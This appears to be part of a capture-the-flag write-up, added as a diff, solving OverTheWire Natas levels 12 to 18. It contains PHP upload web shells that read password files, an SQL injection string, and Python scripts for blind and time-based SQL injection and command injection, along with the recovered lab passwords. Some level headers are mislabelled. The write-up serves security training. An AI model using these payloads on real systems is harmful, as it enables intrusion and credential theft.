@@ -328,3 +328,148 @@ if(array_key_exists("filename", $_POST)) {
 } else {
 ?>
 ```
+It doesn't check signature of file, so we try
+```
+<?php
+    echo shell_exec('cat /etc/natas_webpass/natas13')
+?>
+```
+save natas12.php file, upload file and we got
+```
+username: natas13
+password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY 
+```
+
+**[Natas13](http://natas13.natas.labs.overthewire.org)**  
+We have source code, it's same Natas12 but it check signature of file, so we try
+```
+<?php
+    <pre>
+        shell_exec($_GET[data])
+    </pre>
+?>
+```
+save natas13.php file, upload file and we got
+```
+username: natas14
+password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 
+```
+
+**[Natas14](http://natas14.natas.labs.overthewire.org)**  
+It's simple SQL Injection, input
+```
+" or 1=1; #
+```
+We got
+```
+username: natas15
+password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J 
+```
+
+**[Natas15](http://natas15.natas.labs.overthewire.org)**  
+In source code, it return exists if execute query return number of rows > 0
+```
+if(mysql_num_rows($res) > 0) {
+        echo "This user exists.<br>";
+    }
+```
+We can brute force password
+```
+import requests
+import string
+
+url = 'http://natas15.natas.labs.overthewire.org/'
+characters = string.ascii_letters + '0123456789'
+filter = ''
+for char in characters:
+    myobj = {'username': 'natas16" and password like binary "%' + char + '%" #'}
+    x = requests.post(url, data = myobj, auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
+    if ('exists' in x.text):
+        filter = filter + char
+print(filter)
+
+password = ''
+for i in range(32):
+    for char in filter:
+        myobj = {'username': 'natas16" and password like binary "' + password + char + '%" #'}
+        x = requests.post(url, data = myobj, auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
+        if ('exists' in x.text):
+            password = password + char
+            print(password)
+            break
+```
+```
+username: natas16
+password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh 
+```
+
+**[Natas17](http://natas17.natas.labs.overthewire.org)**  
+It's same Natas16 but have filter
+```
+if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    }
+```
+We can brute force password by using $(command)
+```
+import requests
+import string
+
+url = 'http://natas16.natas.labs.overthewire.org/'
+auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
+
+characters = string.ascii_letters + '0123456789'
+filter = ''
+for char in characters:
+    x = requests.get(url + '?needle=hellos$(grep ' + char + ' /etc/natas_webpass/natas17)&submit=Search', auth=(auth))
+    if ('hellos' not in x.text):
+        filter = filter + char
+print(filter)
+
+password = ''
+for i in range(32):
+    for char in filter:
+        x = requests.get(url + '?needle=hellos$(grep ^' + password + char + ' /etc/natas_webpass/natas17)&submit=Search', auth=(auth))
+        if ('hellos' not in x.text):
+            password = password + char
+            print(password)
+            break
+```
+```
+username: natas17
+password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw 
+```
+
+**[Natas18](http://natas18.natas.labs.overthewire.org)**  
+It's same Natas16 and Natas17 but nothing echo for us,
+We can brute force password by using Time-based attack
+```
+import requests
+import string
+
+url = 'http://natas17.natas.labs.overthewire.org/'
+auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
+
+characters = string.ascii_letters + '0123456789'
+filter = ''
+for char in characters:
+    myobj = {'username': 'natas18" and password like binary "%' + char + '%" and sleep(1) #'}
+    x = requests.post(url, data = myobj, auth=auth)
+    if (x.elapsed.seconds >= 1):
+        filter = filter + char
+print(filter)
+
+password = ''
+for i in range(32):
+    for char in filter:
+        myobj = {'username': 'natas18" and password like binary "' + password + char + '%" and sleep(1) #'}
+        x = requests.post(url, data = myobj, auth=auth)
+        if (x.elapsed.seconds >= 1):
+            password = password + char
+            print(password)
+            break
+```
+```
+username: natas18
+password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP 
+```
